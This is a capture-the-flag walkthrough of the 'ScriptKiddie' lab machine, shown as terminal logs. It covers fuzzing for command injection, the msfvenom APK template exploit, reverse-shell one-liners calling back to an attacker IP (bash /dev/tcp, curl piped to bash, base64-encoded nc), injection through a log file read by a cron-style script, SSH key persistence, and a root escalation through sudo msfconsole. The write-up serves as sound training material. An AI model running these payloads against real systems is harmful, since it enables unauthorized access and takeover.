# Scan

```bash
ghost@localhost [14:41:42] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master]
-> % rustscan -t 2000 -a $IP -- -sC -sV

Open 10.10.10.226:22
Open 10.10.10.226:5000

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/YB1g/YHwZNvTzj8lysM+SzX6dZzRbfF24y3ywkhai4pViGEwUklIPkEvuLSGH97NJ4y8r9uUXzyoq3iuVJ/vGXiFlPCrg+QDp7UnwANBmDqbVLucKdor+JkWHJJ1h3ftpEHgol54tj+6J7ftmaOR29Iwg+FKtcyNG6PY434cfA0Pwshw6kKgFa+HWljNl+41H3WVua4QItPmrh+CrSoaA5kCe0FAP3c2uHcv2JyDjgCQxmN1GoLtlAsEznHlHI1wycNZGcHDnqxEmovPTN4qisOKEbYfy2mu1Eqq3Phv8UfybV8c60wUqGtClj3YOO1apDZKEe8eZZqy5eXU8mIO+uXcp5zxJ/Wrgng7WTguXGzQJiBHSFq52fHFvIYSuJOYEusLWkGhiyvITYLWZgnNL+qAVxZtP80ZTq+lm4cJHJZKl0OYsmqO0LjlMOMTPFyA+W2IOgAmnM+miSmSZ6n6pnSA+LE2Pj01egIhHw5+duAYxUHYOnKLVak1WWk/C68=
|   256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJA31QhiIbYQMUwn/n3+qcrLiiJpYIia8HdgtwkI8JkCDm2n+j6dB3u5I17IOPXE7n5iPiW9tPF3Nb0aXmVJmlo=
|   256 8bcf4182c6acef9180377cc94511e843 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOWjCdxetuUPIPnEGrowvR7qRAR7nuhUbfFraZFmbIr4
5000/tcp open  http    syn-ack Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Port 500 (k1d'5 h4ck3r t00l5)

From nmap scan, it seems to be running Werkzeug/0.16.1 Python (3.8.5) server.

Using `fuff` I fuzz the inputs from the webpage, starting with nmap.

```bash
ghost@localhost [10:48:24] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % ffuf -u http://10.10.10.226:5000 -H 'Content-Type:application/x-www-form-urlencoded' -d 'ip=127.0.0.1FUZZ&action=scan' -w /usr/share/seclists/Fuzzing/special-chars.txt -x http://127.0.0.1:8080

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.10.226:5000
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : ip=127.0.0.1FUZZ&action=scan
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://127.0.0.1:8080
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

"                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 705ms]
\                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 705ms]
#                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 710ms]
&                       [Status: 200, Size: 2424, Words: 161, Lines: 76, Duration: 713ms]
-                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 713ms]
<                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 715ms]
?                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 729ms]
|                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 732ms]
$                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 732ms]
:                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 735ms]
;                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 735ms]
[                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 735ms]
'                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 735ms]
]                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 736ms]
}                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 737ms]
{                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 738ms]
%                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1252ms]
(                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1728ms]
`                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1730ms]
>                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1731ms]
^                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1731ms]
=                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1731ms]
/                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1731ms]
~                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1733ms]
+                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1733ms]
.                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1735ms]
_                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1737ms]
*                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1738ms]
@                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1741ms]
,                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1741ms]
!                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 1742ms]
)                       [Status: 200, Size: 2145, Words: 115, Lines: 67, Duration: 2131ms]
:: Progress: [32/32] :: Job [1/1] :: 32 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

With proxy to Burp Suite, I can see the response. Most of them returns invalid, except `&`.

To confirm this, I run again with filter by `Words` 115.

```bash
ghost@localhost [10:51:56] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % ffuf -u http://10.10.10.226:5000 -H 'Content-Type:application/x-www-form-urlencoded' -d 'ip=127.0.0.1FUZZ&action=scan' -w /usr/share/seclists/Fuzzing/special-chars.txt -x http://127.0.0.1:8080 -fw 115

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.10.226:5000
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : ip=127.0.0.1FUZZ&action=scan
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://127.0.0.1:8080
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 115
________________________________________________

&                       [Status: 200, Size: 2424, Words: 161, Lines: 76, Duration: 573ms]
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

However, `&` is just part of URL parameter. So if we encode it with `%26` we will get `invalid ip`. 

Repeating the same process for `sploits` inputs.

```bash
ghost@localhost [11:03:22] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % ffuf -u http://10.10.10.226:5000 -H 'Content-Type:application/x-www-form-urlencoded' -d 'search=metasploitFUZZ&action=searchsploit' -w /usr/share/seclists/Fuzzing/special-chars.txt -x http://127.0.0.1:8080 -f
w 121

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.10.226:5000
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : search=metasploitFUZZ&action=searchsploit
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://127.0.0.1:8080
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 121
________________________________________________

.                       [Status: 200, Size: 2853, Words: 188, Lines: 78, Duration: 1239ms]
&                       [Status: 200, Size: 227690, Words: 23327, Lines: 2382, Duration: 5428ms]
+                       [Status: 200, Size: 227690, Words: 23327, Lines: 2382, Duration: 5430ms]
:: Progress: [32/32] :: Job [1/1] :: 43 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

After some testing, there's nothing vulnerable on this input as well. So the exploit generator seems to be using `msfvenom`.

So I checked if `msfvenom` itself got an exploit and from the result, it has one with Android template.

```bash
ghost@localhost [11:16:35] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % searchsploit msfvenom
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection   | multiple/local/49491.py
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```


# User

I generated an exploit with curl command inside that will curl the reverse shell script and pipe it to bash.

```bash
# shell.sh: bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# exploit: payload = 'curl 10.10.14.5/shell.sh | bash'

ghost@localhost [11:56:47] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % python3 49491.py
[+] Manufacturing evil apkfile
Payload: nc -e /bin/sh 10.10.14.5 4444
-dname: CN='|echo bmMgLWUgL2Jpbi9zaCAxMC4xMC4xNC41IDQ0NDQ= | base64 -d | sh #

  adding: empty (stored 0%)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
jar signed.

Warning:
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmppd8u6vdm/evil.apk
Do: msfvenom -x /tmp/tmppd8u6vdm/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null
```

Then upload to msfvenom input on the website and get back user.

```bash
ghost@localhost [11:18:38] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.226] 49110
bash: cannot set terminal process group (857): Inappropriate ioctl for device
bash: no job control in this shell

kid@scriptkiddie:~$ cat user.txt
c39ed282534711e84b50bb3d0f5fd6f6
```


# Privilege escalation (fail attempt)

Before I continue, I added my public key to `authorized_keys` of `kid` user, so I can ssh into the server easily.

Running linpeas, I found a sudo version that is vulnerable to privilege escalation.

```bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.31
```

However, the exploit fails because the Glibc does not exists in the system. So instead, I check if any other users exists. From enumeration, found that there's another user called `pwn`.


# Lateral movement

```bash
kid@scriptkiddie:~$ ls /home
kid  pwn

kid@scriptkiddie:~$ ls /home/pwn
recon  scanlosers.sh

kid@scriptkiddie:~$ find /home/pwn -type f -readable -ls 2>/dev/null
     7671      4 -rw-r--r--   1 pwn      pwn           220 Feb 25  2020 /home/pwn/.bash_logout
     7677      4 -rw-rw-r--   1 pwn      pwn            74 Jan 28  2021 /home/pwn/.selected_editor
     7673      4 -rw-r--r--   1 pwn      pwn          3771 Feb 25  2020 /home/pwn/.bashrc
     7675      4 -rw-r--r--   1 pwn      pwn           807 Feb 25  2020 /home/pwn/.profile
     7779      4 -rwxrwxr--   1 pwn      pwn           250 Jan 28  2021 /home/pwn/scanlosers.sh
```

This is the code of `scanlosers.sh`.

```bash
kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

It reads the log of `/logs/hackers` then get the IP and scan their IP with nmap. It splits by space (`-d' '`), then get the rest (starting from column 3, after splitting by space) as IP and no validation done at `sh -c` line.

Therefore, it is vulnerable to arbitrary code execution. For example, you can look the example below.

```bash
ghost@localhost [11:21:35] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % echo 'a b $(ls)' > example

ghost@localhost [11:21:40] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % cat example
a b $(ls)

ghost@localhost [11:21:43] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % cat example | cut -d' ' -f3- | while read exploit; do
> sh -c "echo ${exploit}"
> done
% 49491.py evil.apk example feroxbuster.out ghost ghost.pub shell.sh 
```

So now we are going to do the same on the target machine.

```bash
kid@scriptkiddie:~$ echo 'a b $(bash -c "bash -i &> /dev/tcp/10.10.14.5/4445 0>&1")' > /home/kid/logs/hackers
kid@scriptkiddie:~$

...

ghost@localhost [13:01:47] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.226] 45016
bash: cannot set terminal process group (870): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ id
id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)

```

Then I copy my public key to `authorized_key` to SSH as `pwn` easily.

```bash
ghost@localhost [13:04:20] [~/Documents/hacking/tj-null-boxes/scriptkiddie] [master *]
-> % ssh pwn@10.10.10.226 -i ghost

pwn@scriptkiddie:~$
```


# Privilege escalation

From `sudo -l` I can see that the user `pwn` can run `msfconsole` without password. So this can be used to escalate the user into sudo.

```bash
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole


pwn@scriptkiddie:~$ sudo msfconsole

IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x

msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> system("/bin/bash")
root@scriptkiddie:/home/pwn# id
uid=0(root) gid=0(root) groups=0(root)

root@scriptkiddie:/home/pwn# cd ~

root@scriptkiddie:~# ls
root.txt  snap

root@scriptkiddie:~# cat root.txt
ba35f51405b8d9f6d8e8d996b3b1a123
```

